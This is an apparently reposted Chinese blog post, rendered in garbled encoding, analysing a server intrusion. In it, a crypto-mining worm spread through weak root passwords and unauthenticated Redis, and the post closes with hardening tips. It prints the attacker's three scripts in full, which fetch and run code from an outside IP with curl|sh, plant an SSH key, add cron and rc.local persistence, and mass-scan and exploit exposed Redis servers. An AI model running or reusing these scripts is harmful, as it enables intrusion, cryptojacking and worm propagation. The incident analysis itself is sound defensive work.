å…³äº"><span>ğŸ™‹ğŸ»â€â™‚ï¸ å…³äº</span></a></li><li><a href=https://www.lvbibir.cn/links title="ğŸ¤ å‹é“¾"><span>ğŸ¤ å‹é“¾</span></a></li></ul></nav></header><main class="main page"><article class=post-single><div id=single-content><header class=post-header><div class=breadcrumbs><a href=https://www.lvbibir.cn>ä¸»é¡µ</a>&nbsp;Â»&nbsp;<a href=https://www.lvbibir.cn/posts/>ğŸ“š æ–‡ç« </a>&nbsp;Â»&nbsp;<a href=https://www.lvbibir.cn/posts/tech/>ğŸ‘¨ğŸ»â€ğŸ’» æŠ€æœ¯</a></div><h1 class=post-title>è®°ä¸€æ¬¡æœåŠ¡å™¨è¢«å…¥ä¾µå…¨è¿‡ç¨‹</h1><div class=post-meta>åˆ›å»º:&nbsp;<span title='2021-08-01 00:00:00 +0000 UTC'>2021-08-01</span>&nbsp;|&nbsp;æ›´æ–°:&nbsp;2021-08-01&nbsp;|&nbsp;å­—æ•°:&nbsp;2801å­—&nbsp;|&nbsp;æ—¶é•¿:&nbsp;6åˆ†é’Ÿ&nbsp;|&nbsp;
ä½œè€…:&nbsp;lvbibir
&nbsp;|&nbsp;æ ‡ç­¾: &nbsp;<ul class=post-tags-meta><a href=https://www.lvbibir.cn/tags/linux/>linux</a></ul><span id=busuanzi_container_page_pv>&nbsp;| è®¿é—®: <span id=busuanzi_value_page_pv></span></span></div></header><div class=post-content><p>å‘¨ä¸€æ—©ä¸Šåˆšåˆ°åŠå…¬å®¤ï¼Œå°±å¬åˆ°åŒäº‹è¯´æœ‰ä¸€å°æœåŠ¡å™¨ç™»é™†ä¸ä¸Šäº†ï¼Œæˆ‘ä¹Ÿæ²¡æ”¾åœ¨å¿ƒä¸Šï¼Œç»§ç»­è¾¹åƒæ—©ç‚¹ï¼Œè¾¹çœ‹å¸ä»·æ˜¯ä¸æ˜¯åˆè·Œäº†ã€‚ä¸ä¸€ä¼šè¿ç»´çš„åŒäº‹ä¹Ÿåˆ°äº†ï¼Œæ°”å–˜ååçš„è¯´ï¼šæˆ‘ä»¬æœ‰å°æœåŠ¡å™¨è¢«é˜¿é‡Œäº‘å†»ç»“äº†ï¼Œç†ç”±ï¼šå¯¹å¤–æ¶æ„å‘åŒ…ã€‚æˆ‘æ”¾ä¸‹é…¸èœé¦…çš„åŒ…å­ï¼Œsshè¿äº†ä¸€ä¸‹ï¼Œè¢«æ‹’ç»äº†ï¼Œé—®äº†ä¸‹é»˜è®¤çš„22ç«¯å£è¢«å°äº†ã€‚è®©è¿ç»´çš„åŒäº‹æŠŠç«¯å£æ”¹äº†ä¸€ä¸‹ï¼Œç«‹é©¬è¿ä¸Šå»ï¼Œé¡ºä¾¿çœ‹äº†ä¸€ä¸‹ç™»å½•å:rootï¼Œè¿˜æœ‰ä¸è¶³8ä½çš„å°ç™½å¯†ç ï¼Œå¿ƒé‡Œä¸€å‡‰ï¼šè¢«é»‘äº†ï¼</p><p>æœåŠ¡å™¨ç³»ç»ŸCentOS 6.Xï¼Œéƒ¨ç½²äº†nginxï¼Œtomcatï¼Œredisç­‰åº”ç”¨ï¼Œä¸Šæ¥å…ˆæŠŠæ•°æ®åº“å…¨å¤‡ä»½åˆ°æœ¬åœ°ï¼Œç„¶åtopå‘½ä»¤çœ‹äº†ä¸€ä¸‹ï¼Œæœ‰2ä¸ª99%çš„åŒåè¿›ç¨‹è¿˜åœ¨è¿è¡Œï¼Œå«gpg-agentdã€‚</p><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUk13NIsMwEsy0crJQXZ0FlS175qiaaaFRvqibZDicoWJXQgFaIrpZvicQ3Q/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=å›¾ç‰‡></p><p>googleäº†ä¸€ä¸‹gpgï¼Œç»“æœæ˜¯ï¼š</p><blockquote><p>GPGæä¾›çš„gpg-agentæä¾›äº†å¯¹SSHåè®®çš„æ”¯æŒï¼Œè¿™ä¸ªåŠŸèƒ½å¯ä»¥å¤§å¤§ç®€åŒ–å¯†é’¥çš„ç®¡ç†å·¥ä½œã€‚</p></blockquote><p>çœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªå¾ˆæ­£ç»çš„ç¨‹åºå˜›ï¼Œä½†ä»”ç»†å†çœ‹çœ‹æœåŠ¡å™¨ä¸Šçš„è¿›ç¨‹åé¢è¿˜è·Ÿç€ä¸€ä¸ªå­—æ¯dï¼Œä¼ªè£…çš„å¾ˆå¥½ï¼Œè®©äººæƒ³èµ·æ¥windowsä¸Šå„ç§çœ‹èµ·æ¥åƒsvchost.exeçš„ç—…æ¯’ã€‚ç»§ç»­</p><pre tabindex=0><code>ps eho command -p 23374netstat -pan | grep 23374
</code></pre><p>æŸ¥çœ‹pid:23374è¿›ç¨‹å¯åŠ¨è·¯å¾„å’Œç½‘ç»œçŠ¶å†µï¼Œä¹Ÿå°±æ˜¯æ¥åˆ°äº†å›¾1çš„ç›®å½•ï¼Œåˆ°æ­¤å·²ç»æ‰¾åˆ°äº†é»‘å®¢ç•™ä¸‹çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚æ¥ä¸‹æ¥è¿˜æœ‰2ä¸ªé—®é¢˜åœ¨ç­‰ç€æˆ‘ï¼š</p><blockquote><p>1ã€æ–‡ä»¶æ˜¯æ€ä¹ˆä¸Šä¼ çš„ï¼Ÿ
2ã€è¿™ä¸ªæ–‡ä»¶çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Œæˆ–æ˜¯é»‘å®¢æƒ³å¹²å˜›ï¼Ÿ</p></blockquote><p>historyçœ‹ä¸€ä¸‹ï¼Œè®°å½•æœç„¶éƒ½è¢«æ¸…æ‰äº†ï¼Œæ²¡ç•™ä¸‹ä»»ä½•ç—•è¿¹ã€‚ç»§ç»­å‘½ä»¤more messagesï¼Œ</p><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUYxokiaN7XW4UAvKIbbZBrIaOkJ9PszZdJMcrcAeiajCCWk9Puh3Xia5pA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=å›¾ç‰‡></p><p>çœ‹åˆ°äº†åœ¨åŠå¤œ12ç‚¹å·¦å³ï¼Œåœ¨æœåŠ¡å™¨ä¸Šè£…äº†å¾ˆå¤šè½¯ä»¶ï¼Œå…¶ä¸­æœ‰å‡ ä¸ªè½¯ä»¶å¼•èµ·äº†æˆ‘çš„æ³¨æ„ï¼Œä¸‹é¢è¯¦ç»†è®²ã€‚è¾¹æ‰¾è¾¹çŒœï¼Œå¦‚æœæˆ‘ä»¬è¦åšåäº‹ï¼Œå¤§æ¦‚ä¼šåœ¨å“ªé‡Œåšæ–‡ç« ï¼Œè‡ªåŠ¨å¯åŠ¨ï¼Ÿå®šæ—¶å¯åŠ¨ï¼Ÿå¯¹ï¼Œè®¡åˆ’ä»»åŠ¡ã€‚</p><pre tabindex=0><code>crontab -e
</code></pre><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUib88hYObUI1R3UaGxYSpDgvbPbB42mOLYBGH9XqCsBQCW7FtjNnVtlg/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=å›¾ç‰‡></p><p>æœç„¶ï¼Œçº¿ç´¢æ‰¾åˆ°äº†ã€‚</p><p>ä¸Šé¢çš„è®¡åˆ’ä»»åŠ¡çš„æ„æ€å°±æ˜¯æ¯15åˆ†é’Ÿå»æœåŠ¡å™¨ä¸Šä¸‹è½½ä¸€ä¸ªè„šæœ¬ï¼Œå¹¶ä¸”æ‰§è¡Œè¿™ä¸ªè„šæœ¬ã€‚æˆ‘ä»¬æŠŠè„šæœ¬ä¸‹è½½ä¸‹æ¥çœ‹ä¸€ä¸‹ã€‚</p><pre tabindex=0><code>curl -fsSL 159.89.190.243/ash.php &gt; ash.sh
</code></pre><p>è„šæœ¬å†…å®¹å¦‚ä¸‹ï¼š</p><pre tabindex=0><code>uname -aidhostnamesetenforce 0 2&gt;/dev/nullulimit -n 50000ulimit -u 50000crontab -r 2&gt;/dev/nullrm -rf /var/spool/cron/* 2&gt;/dev/nullmkdir -p /var/spool/cron/crontabs 2&gt;/dev/nullmkdir -p /root/.ssh 2&gt;/dev/nullecho &#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX&#39; &gt; /root/.ssh/authorized_keysecho &#39;*/15 * * * * curl -fsSL 159.89.190.243/ash.php|sh&#39; &gt; /var/spool/cron/rootecho &#39;*/20 * * * * curl -fsSL 159.89.190.243/ash.php|sh&#39; &gt; /var/spool/cron/crontabs/rootyum install -y bash 2&gt;/dev/nullapt install -y bash 2&gt;/dev/nullapt-get install -y bash 2&gt;/dev/nullbash -c &#39;curl -fsSL 159.89.190.243/bsh.php|bash&#39; 2&gt;/dev/null
</code></pre><p>å¤§è‡´åˆ†æä¸€ä¸‹è¯¥è„šæœ¬çš„ä¸»è¦ç”¨é€”ï¼š</p><blockquote><p>é¦–å…ˆæ˜¯å…³é—­SELinuxï¼Œè§£é™¤shellèµ„æºè®¿é—®é™åˆ¶ï¼Œç„¶ååœ¨/root/.ssh/authorized_keysæ–‡ä»¶ä¸­ç”Ÿæˆsshå…¬é’¥ï¼Œè¿™æ ·æ¯æ¬¡é»‘å®¢ç™»å½•è¿™å°æœåŠ¡å™¨å°±å¯ä»¥å…å¯†ç ç™»å½•äº†ï¼Œæ‰§è¡Œè„šæœ¬å°±ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œå…³äºssh keysçš„æ–‡ç« å¯ä»¥å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« SSHåŸç†ä¸è¿ç”¨ã€‚æ¥ä¸‹æ¥å®‰è£…bashï¼Œæœ€åæ˜¯ç»§ç»­ä¸‹è½½ç¬¬äºŒä¸ªè„šæœ¬bsh.phpï¼Œå¹¶ä¸”æ‰§è¡Œã€‚</p></blockquote><p>ç»§ç»­ä¸‹è½½å¹¶åˆ†æbsh.pbpï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p><pre tabindex=0><code>sleep $( seq 3 7 | sort -R | head -n1 )cd /tmp || cd /var/tmpsleep 1mkdir -p .ICE-unix/... &amp;&amp; chmod -R 777 .ICE-unix &amp;&amp; cd .ICE-unix/...sleep 1if [ -f .watch ]; thenrm -rf .watchexit 0fisleep 1echo 1 &gt; .watchsleep 1ps x | awk &#39;!/awk/ &amp;&amp; /redisscan|ebscan|redis-cli/ {print $1}&#39; | xargs kill -9 2&gt;/dev/nullps x | awk &#39;!/awk/ &amp;&amp; /barad_agent|masscan|.sr0|clay|udevs|.sshd|xig/ {print $1}&#39; | xargs kill -9 2&gt;/dev/nullsleep 1if ! [ -x /usr/bin/gpg-agentd ]; thencurl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.dbecho &#39;/usr/bin/gpg-agentd&#39; &gt; /etc/rc.localecho &#39;curl -fsSL 159.89.190.243/ash.php|sh&#39; &gt;&gt; /etc/rc.localecho &#39;exit 0&#39; &gt;&gt; /etc/rc.localfisleep 1chmod +x /usr/bin/gpg-agentd &amp;&amp; /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentdsleep 1if ! [ -x &#34;$(command -v masscan)&#34; ]; thenrm -rf /var/lib/apt/lists/*rm -rf x1.tar.gzif [ -x &#34;$(command -v apt-get)&#34; ]; thenexport DEBIAN_FRONTEND=noninteractiveapt-get update -yapt-get install -y debconf-docapt-get install -y build-essentialapt-get install -y libpcap0.8-dev libpcap0.8apt-get install -y libpcap*apt-get install -y make gcc gitapt-get install -y redis-serverapt-get install -y redis-toolsapt-get install -y redisapt-get install -y iptablesapt-get install -y wget curlfiif [ -x &#34;$(command -v yum)&#34; ]; thenyum update -yyum install -y epel-releaseyum update -yyum install -y git iptables make gcc redis libpcap libpcap-develyum install -y wget curlfisleep 1curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gzsleep 1[ -f x1.tar.gz ] &amp;&amp; tar zxf x1.tar.gz &amp;&amp; cd masscan-1.0.4 &amp;&amp; make &amp;&amp; make install &amp;&amp; cd .. &amp;&amp; rm -rf masscan-1.0.4fisleep 3 &amp;&amp; rm -rf .watchbash -c &#39;curl -fsSL 159.89.190.243/rsh.php|bash&#39; 2&gt;/dev/null
</code></pre><p>è¿™æ®µè„šæœ¬çš„ä»£ç æ¯”è¾ƒé•¿ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æœ‰4ä¸ªï¼š</p><blockquote><p>\1. ä¸‹è½½è¿œç¨‹ä»£ç åˆ°æœ¬åœ°ï¼Œæ·»åŠ æ‰§è¡Œæƒé™ï¼Œchmod u+xã€‚
\2. ä¿®æ”¹rc.localï¼Œè®©æœ¬åœ°ä»£ç å¼€æœºè‡ªåŠ¨æ‰§è¡Œã€‚
\3. ä¸‹è½½githubä¸Šçš„å¼€æºæ‰«æå™¨ä»£ç ï¼Œå¹¶å®‰è£…ç›¸å…³çš„ä¾èµ–è½¯ä»¶ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä¸Šé¢çš„messagesé‡Œçœ‹åˆ°çš„è®°å½•ã€‚
\4. ä¸‹è½½ç¬¬ä¸‰ä¸ªè„šæœ¬ï¼Œå¹¶ä¸”æ‰§è¡Œã€‚</p></blockquote><p>æˆ‘å»githubä¸Šçœ‹äº†ä¸‹è¿™ä¸ªå¼€æºä»£ç ï¼Œç®€ç›´åŠç‚¸å¤©ã€‚</p><blockquote><p>MASSCAN: Mass IP port scanner
This is the fastest Internet port
scanner. It can scan the entire Internet in under 6 minutes, >
transmitting 10 million packets per second.
It produces results similar to nmap, the most famous port scanner.
Internally, it operates more > like scanrand, unicornscan, and ZMap,
using asynchronous transmission. The major difference is > that it&rsquo;s
faster than these other scanners. In addition, it&rsquo;s more flexible,
allowing arbitrary > address ranges and port ranges.
NOTE: masscan uses a custom TCP/IP stack. Anything other than simple
port scans will cause conflict with the local TCP/IP stack. This means
you need to either use the -S option to use a separate IP address, or
configure your operating system to firewall the ports that masscan uses.</p></blockquote><p>transmitting 10 million packets per second(æ¯ç§’å‘é€1000ä¸‡ä¸ªæ•°æ®åŒ…)ï¼Œæ¯”nmapé€Ÿåº¦è¿˜è¦å¿«ï¼Œè¿™å°±ä¸éš¾ç†è§£ä¸ºä»€ä¹ˆé˜¿é‡Œäº‘æŠŠæœåŠ¡å™¨å†»ç»“äº†ï¼Œå¤§æ¦‚çœ‹äº†ä¸‹readmeä¹‹åï¼Œæˆ‘ä¹Ÿæ²¡æœ‰ç»†ç©¶ï¼Œç»§ç»­ä¸‹è½½ç¬¬ä¸‰ä¸ªè„šæœ¬ã€‚</p><pre tabindex=0><code>setenforce 0 2&gt;/dev/nullulimit -n 50000ulimit -u 50000sleep 1iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2&gt;/dev/nulliptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2&gt;/dev/nullsleep 1rm -rf .dat .shard .ranges .lan 2&gt;/dev/nullsleep 1echo &#39;config set dbfilename &#34;backup.db&#34;&#39; &gt; .datecho &#39;save&#39; &gt;&gt; .datecho &#39;flushall&#39; &gt;&gt; .datecho &#39;set backup1 &#34;


*/2 * * * * curl -fsSL http://159.89.190.243/ash.php | sh

&#34;&#39; &gt;&gt; .datecho &#39;set backup2 &#34;


*/3 * * * * wget -q -O- http://159.89.190.243/ash.php | sh

&#34;&#39; &gt;&gt; .datecho &#39;set backup3 &#34;


*/4 * * * * curl -fsSL http://159.89.190.243/ash.php | sh

&#34;&#39; &gt;&gt; .datecho &#39;set backup4 &#34;


*/5 * * * * wget -q -O- http://159.89.190.243/ash.php | sh

&#34;&#39; &gt;&gt; .datecho &#39;config set dir &#34;/var/spool/cron/&#34;&#39; &gt;&gt; .datecho &#39;config set dbfilename &#34;root&#34;&#39; &gt;&gt; .datecho &#39;save&#39; &gt;&gt; .datecho &#39;config set dir &#34;/var/spool/cron/crontabs&#34;&#39; &gt;&gt; .datecho &#39;save&#39; &gt;&gt; .datsleep 1masscan --max-rate 10000 -p6379,6380 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2&gt;/dev/null | awk &#39;{print $6, substr($4, 1, length($4)-4)}&#39; | sort | uniq &gt; .shardsleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;done &lt; .shardsleep 1masscan --max-rate 10000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2&gt;/dev/null | awk &#39;{print $6, substr($4, 1, length($4)-4)}&#39; | sort | uniq &gt; .rangessleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;done &lt; .rangessleep 1ip a | grep -oE &#39;([0-9]{1,3}.?){4}/[0-9]{2}&#39; 2&gt;/dev/null | sed &#39;s//([0-9]{2})//16/g&#39; &gt; .inetsleep 1masscan --max-rate 10000 -p6379,6380 -iL .inet | awk &#39;{print $6, substr($4, 1, length($4)-4)}&#39; | sort | uniq &gt; .lansleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2&gt;/dev/null 1&gt;/dev/null &amp;done &lt; .lansleep 60rm -rf .dat .shard .ranges .lan 2&gt;/dev/null
</code></pre><p>å¦‚æœè¯´å‰ä¸¤ä¸ªè„šæœ¬åªæ˜¯åœ¨æœåŠ¡å™¨ä¸Šä¸‹è½½æ‰§è¡Œäº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‚£è¿™ä¸ªè„šæœ¬æ‰çœŸæ­£æ˜¾ç¤ºç—…æ¯’çš„å¨åŠ›ã€‚ä¸‹é¢å°±æ¥åˆ†æè¿™ä¸ªè„šæœ¬ã€‚</p><p>ä¸€å¼€å§‹çš„ä¿®æ”¹ç³»ç»Ÿç¯å¢ƒæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œæ¥ä¸‹æ¥çš„å†™æ–‡ä»¶æ“ä½œæœ‰ç‚¹çœ¼ç†Ÿï¼Œå¦‚æœç”¨è¿‡redisçš„äººï¼Œåº”è¯¥èƒ½çŒœåˆ°ï¼Œè¿™é‡Œæ˜¯å¯¹redisè¿›è¡Œé…ç½®ã€‚å†™è¿™ä¸ªé…ç½®ï¼Œè‡ªç„¶ä¹Ÿå°±æ˜¯åˆ©ç”¨äº†redisæŠŠç¼“å­˜å†…å®¹å†™å…¥æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œç»“æœå°±æ˜¯ç”¨æœ¬åœ°çš„ç§é’¥å»ç™»é™†è¢«å†™å…¥å…¬é’¥çš„æœåŠ¡å™¨äº†ï¼Œæ— éœ€å¯†ç å°±å¯ä»¥ç™»é™†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ–‡ç« æœ€å¼€å§‹çš„/root/.ssh/authorized_keysã€‚ç™»å½•ä¹‹åå°±å¼€å§‹å®šæœŸæ‰§è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œä¸‹è½½è„šæœ¬ã€‚å¥½äº†ï¼Œé…ç½®æ–‡ä»¶å‡†å¤‡å¥½äº†ï¼Œå°±å¼€å§‹åˆ©ç”¨masscanè¿›è¡Œå…¨ç½‘æ‰«æredisæœåŠ¡å™¨ï¼Œå¯»æ‰¾è‚‰é¸¡ï¼Œæ³¨æ„çœ‹è¿™6379å°±æ˜¯redisæœåŠ¡å™¨çš„é»˜è®¤ç«¯å£ï¼Œå¦‚æœä½ çš„redisçš„ç›‘å¬ç«¯å£æ˜¯å…¬ç½‘IPæˆ–æ˜¯0.0.0.0ï¼Œå¹¶ä¸”æ²¡æœ‰å¯†ç ä¿æŠ¤ï¼Œä¸å¥½æ„æ€ï¼Œä½ å°±ä¸­æ‹›äº†ã€‚</p><p>é€šè¿‡ä¾æ¬¡åˆ†æè¿™3ä¸ªè„šæœ¬ï¼Œå°±èƒ½çœ‹å‡ºè¿™ä¸ªç—…æ¯’çš„å¯æ€•ä¹‹å¤„ï¼Œå…ˆæ˜¯é€šè¿‡å†™å…¥ssh public key æ‹¿åˆ°ç™»å½•æƒé™ï¼Œç„¶åä¸‹è½½æ‰§è¡Œè¿œç¨‹äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæœ€åå†é€šè¿‡redisæ¼æ´å¤åˆ¶ï¼Œè¿…é€Ÿåœ¨å…¨ç½‘ä¼ æ’­ï¼Œä»¥æŒ‡æ•°çº§é€Ÿåº¦å¢é•¿ã€‚é‚£ä¹ˆé—®é¢˜æ˜¯ï¼Œè¿™å°æœåŠ¡å™¨æ˜¯æ€ä¹ˆä¸­æ‹›çš„å‘¢ï¼Ÿçœ‹äº†ä¸‹redis.confï¼Œbindçš„åœ°å€æ˜¯127.0.0.1ï¼Œæ²¡å•¥é—®é¢˜ã€‚ç”±æ­¤å¯ä»¥æ¨æ–­ï¼Œåº”è¯¥æ˜¯rootå¸å·è¢«æš´åŠ›ç ´è§£äº†ï¼Œä¸ºäº†éªŒè¯æˆ‘çš„æƒ³æ³•ï¼Œæˆ‘lastbçœ‹äº†ä¸€ä¸‹ï¼Œæœç„¶æœ‰å¤§é‡çš„è®°å½•ï¼š</p><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUxRx7dZWNXxbgjEznbkJofHllQjbqvL9BicWIaGOnZplMJu4gh58Wa5Q/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=å›¾ç‰‡></p><p>è¿˜å‰©æœ€åä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªgpg-agentdç¨‹åºåˆ°åº•æ˜¯å¹²ä»€ä¹ˆçš„å‘¢ï¼Ÿæˆ‘å½“æ—¶çš„ç¬¬ä¸€ä¸ªååº”å°±æ˜¯çŸ¿æœºï¼Œå› ä¸ºç°åœ¨æ•°å­—è´§å¸å¤ªç«äº†ï¼ŒåŠ å¤§äº†åˆ†å¸ƒå¼çŸ¿æœºçš„éœ€æ±‚ï¼Œä¹Ÿå°±å‚¬ç”Ÿäº†è¿™æ¡ç°è‰²äº§ä¸šé“¾ã€‚äºæ˜¯ï¼Œé¡ºæ‰‹æŠŠè¿™ä¸ªgpg-agentdæ‹–åˆ°idaä¸­ï¼Œç”¨stringæœç´¢bitcoin,eth, mineç­‰ç›¸å…³å•è¯ï¼Œæœ€ç»ˆå‘ç°äº†è¿™ä¸ªï¼š</p><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUFmZ3tXSY9KFwD2pcaJ7jbApwiaXFpZLDNHa1PjAFSNKUnNYcRxgbibrA/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=å›¾ç‰‡></p><p>æ‰“å¼€ nicehash.com çœ‹ä¸€ä¸‹ï¼Œä¸€åˆ‡éƒ½æ¸…æ™°äº†ã€‚</p><p><img loading=lazy src="https://mmbiz.qpic.cn/mmbiz_jpg/D727NicjCjMMSmebDdKWia1qbRcIfWJZLUV5wDgVOIJYdib0DX3Zib4H5R85BCHtF4UNOzsW88smRs1CKOdmoSkujQ/640?wx_fmt=jpeg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt=å›¾ç‰‡></p><p>ä¸€ã€æœåŠ¡å™¨</p><blockquote><p>\1. ç¦ç”¨ROOT
\2. ç”¨æˆ·åå’Œå¯†ç å°½é‡å¤æ‚
\3. ä¿®æ”¹sshçš„é»˜è®¤22ç«¯å£
\4. å®‰è£…DenyHostsé˜²æš´åŠ›ç ´è§£è½¯ä»¶
\5. ç¦ç”¨å¯†ç ç™»å½•ï¼Œä½¿ç”¨RSAå…¬é’¥ç™»å½•</p></blockquote><p>äºŒã€redis</p><blockquote><p>\1. ç¦ç”¨å…¬ç½‘IPç›‘å¬ï¼ŒåŒ…æ‹¬0.0.0.0
\2. ä½¿ç”¨å¯†ç é™åˆ¶è®¿é—®redis
\3. ä½¿ç”¨è¾ƒä½æƒé™å¸å·è¿è¡Œredis</p></blockquote><p>åŸæ–‡é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/FUv-7-1C30U-A81bDn8dbA</p></div><div class=post-reward><div style=padding:0;margin:0;width:100%;font-size:16px;text-align:center><div id=QR style=opacity:0><div id=wechat style=display:inline-block><a class=fancybox rel=group><img id=wechat_qr src=https://www.lvbibir.cn/img/wechat_pay.png alt=wechat_pay></a><p>å¾®ä¿¡</p></div><div id=alipay style=display:inline-block><a class=fancybox rel=group><img id=alipay_qr src=https://www.lvbibir.cn/img/alipay.png alt=alipay></a><p>æ”¯ä»˜å®</p></div></div><button id=rewardButton onclick='var qr=document.getElementById("QR");qr.style.opacity==="0"?qr.style.opacity="1":qr.style.opacity="0"'>
<span>ğŸ§§ é¼“åŠ±</span></button></div></div><footer class=post-footer><nav class=paginav><a class=prev href=https://www.lvbibir.cn/posts/blog/wordpress-to-docker/><span class=title>Â« ä¸Šä¸€é¡µ</span><br><span>wordpressè¿ç§»åˆ°docker</span></a>
<a class=next href=https://www.lvbibir.cn/posts/tech/centos7-deploy-benchmark/><span class=title>ä¸‹ä¸€é¡µ Â»</span><br><span>centos7åŸºçº¿æ£€æŸ¥å¹³å°éƒ¨ç½²</span></a></nav></footer></div><div><div class=pagination__title><span class=pagination__title-h style=font-size:20px>ğŸ’¬è¯„è®º</span><hr></div><div id=tcomment></div><script src=https://cdn.staticfile.org/twikoo/1.6.7/twikoo.all.min.js></script><script>twikoo.init({envId:"https://twikoo.lvbibir.cn/",el:"#tcomment",lang:"zh-CN",path:window.TWIKOO_MAGIC_PATH||window.location.pathname})</script></div></article></main><footer class=footer><a href=https://gohugo.io/ target=_blank><img style=display:unset src=https://image.lvbibir.cn/blog/frame-hugo-blue.svg></a>
<a href=https://github.com/adityatelange/hugo-PaperMod target=_blank><img style=display:unset src=https://image.lvbibir.cn/blog/theme-papermod-lightgrey.svg></a>
<a href=https://cn.aliyun.com/ target=_blank><img style=display:unset src=https://image.lvbibir.cn/blog/å›¾åºŠ-é˜¿é‡Œäº‘-orange.svg></a><br><span id=runtime_span></span>
<script type=text/javascript>function show_runtime(){window.setTimeout("show_runtime()",1e3),X=new Date("7/13/2021 1:00:00"),Y=new Date,T=Y.getTime()-X.getTime(),M=24*60*60*1e3,a=T/M,A=Math.floor(a),b=(a-A)*24,B=Math.floor(b),c=(b-B)*60,C=Math.floor((b-B)*60),D=Math.floor((c-C)*60),runtime_span.innerHTML="ç½‘ç«™å·²è¿è¡Œ"+A+"å¤©"+B+"å°æ—¶"+C+"åˆ†"+D+"ç§’"}show_runtime()</script>|
<script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
<span id=busuanzi_container>æ€»è®¿å®¢æ•°: <span id=busuanzi_value_site_uv></span>
|
æ€»è®¿é—®é‡: <span id=busuanzi_value_site_pv></span></span><br><a href=https://beian.miit.gov.cn/ target=_blank style="border-bottom:1px solid">äº¬ICPå¤‡2021023168å·-1</a>&nbsp;
|
<span>Copyright
&copy;
2020-2022
<a href=https://www.lvbibir.cn style="border-bottom:1px solid">lvbibir's Blog</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><span class=topInner><svg class="topSvg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg><span id=read_progress></span></span></a>
<script>document.addEventListener("scroll",function(){const t=document.getElementById("read_progress"),n=document.documentElement.scrollHeight,s=document.documentElement.clientHeight,o=document.documentElement.scrollTop||document.body.scrollTop;t.innerText=((o/(n-s)).toFixed(2)*100).toFixed(0)})</script><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var 